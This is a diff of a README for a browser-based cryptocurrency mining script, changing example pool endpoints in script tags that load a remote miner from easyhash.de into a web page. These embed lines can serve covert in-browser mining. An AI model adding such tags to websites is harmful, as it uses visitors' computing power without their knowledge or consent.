@@ -21,9 +21,9 @@ Information for all miners: Please use a own custom frontend solution for your 1
 
 #### Edit the index.html and add your favorite coin/algo<br>
 
-#### Examples: Zergpool Flex Algo - XMR Monero Payout in gutav.js password field should c=XMR | or any other payout coin, check out the pool website for more details ;) <br> need ?algo=flex/native<br>
+#### Examples: Zpool Flex Algo - Dogecoin Payout in gutav.js password field should c=DOGE | or any other payout coin, check out the pool website for more details ;) <br> need ?algo=flex/native<br>
 ```sh
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=flex.eu.mine.zergpool.com:6435" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cn/r?jason=flex.na.mine.zpool.ca:3340" > </script>
 ```
 #### Examples: Moneroocean Auto Algo Switch - mining the most profitable coin - XMR Monero Payout | Best choice for mining ;) (not for the moment, MO do pure XMR mining right now) <br> (Its working after Monero Hardfork RandomX, if you want xmr payouts)<br> (CN/CN-Lite/CN-Fast/CN-Half/CN-Pico/CN-RWZ/CN-Heavy:xhv/Argon2id-Chukwa/Argon2id-Chukwav2/Ghostrider/flex)<br> need ?algo=cn/r<br>
 ```sh
@@ -100,32 +100,31 @@ Information for all miners: Please use a own custom frontend solution for your 1
 #### Examples: Minotaurx Coins - need ?algo=minotaurx<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=minotaurx?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=minotaurx?jason=minotaurx.eu.mine.zergpool.com:7019" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=minotaurx?jason=minotaurx.na.mine.zpool.ca:7019" > </script>
 ```
 #### Examples: Ghostrider Native Coins - need ?algo=ghostrider/native - dont use it on moneroocean or c3pool<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=ghostrider/native?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=ghostrider/native?jason=ghostrider.eu.mine.zergpool.com:5354" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=ghostrider/native?jason=ghostrider.na.mine.zpool.ca:5354" > </script>
 ```
 #### Examples: Flex Native Coins - need ?algo=flex/native - dont use it on moneroocean or c3pool<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=flex/native?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=flex/native?jason=flex.eu.mine.zergpool.com:6435" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=flex/native?jason=flex.na.mine.zpool.ca:3340" > </script>
 ```
 #### Examples: x16RT Coins - need ?algo=x16rt<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=x16rt?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=x16rt?jason=x16rt.eu.mine.zergpool.com:3696" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=x16rt?jason=x16rt.na.mine.zpool.ca:3646" > </script>
 ```
 #### Examples: Allium Coins - need ?algo=allium<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=allium?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=allium?jason=allium.eu.mine.zergpool.com:6433" > </script>
+<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=allium?jason=allium.na.mine.zpool.ca:6433" > </script>
 ```
 #### Examples: CPUPOWER Coins - need ?algo=cpupower<br> 
 ```sh
 <script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cpupower?jason=Your_Favorite_Pool:PortNr" > </script>
-<script src="https://easyhash.de/mmh/mmh.js?perfekt=wss://?algo=cpupower?jason=cpupower.eu.mine.zergpool.com:4250" > </script>
 ```
 <br><br> 
 Or use our integration for websites & blogs
